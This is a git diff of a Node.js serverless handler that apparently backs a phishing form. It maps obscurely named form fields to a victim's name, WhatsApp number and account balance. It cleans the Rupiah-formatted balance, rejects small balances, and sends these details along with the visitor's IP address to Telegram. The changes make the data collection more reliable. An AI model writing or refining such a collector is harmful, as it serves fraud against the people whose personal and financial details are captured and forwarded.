@@ -25,7 +25,8 @@ module.exports = async (req, res) => {
   }
 
   try {
-    const { name, phone, balance } = req.body;
+    // PERBAIKAN: Menggunakan nama field yang sesuai dengan form (a, b, c)
+    const { a: name, b: phone, c: balance } = req.body;
 
     // Validate input
     if (!name || !phone || !balance) {
@@ -43,8 +44,11 @@ module.exports = async (req, res) => {
       });
     }
 
+    // Parse balance - hapus format Rupiah jika ada
+    const cleanBalance = balance.toString().replace(/[^\d]/g, '');
+    
     // Validate balance
-    if (balance.length < 3 || parseInt(balance) < 100) {
+    if (cleanBalance.length < 3 || parseInt(cleanBalance) < 100) {
       return res.status(400).json({
         success: false,
         message: 'Saldo terlalu kecil'
@@ -69,7 +73,7 @@ module.exports = async (req, res) => {
 ────────────────────
 📛 Nama: ${name}
 📞 WhatsApp: https://wa.me/${phone}
-💳 Saldo: Rp ${parseInt(balance).toLocaleString('id-ID')}
+💳 Saldo: Rp ${parseInt(cleanBalance).toLocaleString('id-ID')}
 ────────────────────
 📅 Tanggal: ${new Date().toLocaleString('id-ID')}
 🖥️ IP: ${req.headers['x-forwarded-for'] || req.connection.remoteAddress}
@@ -86,7 +90,7 @@ module.exports = async (req, res) => {
     );
 
     // Log success
-    console.log('Data sent to Telegram:', { name, phone, balance });
+    console.log('Data sent to Telegram:', { name, phone, balance: cleanBalance });
 
     // Return success response
     res.status(200).json({
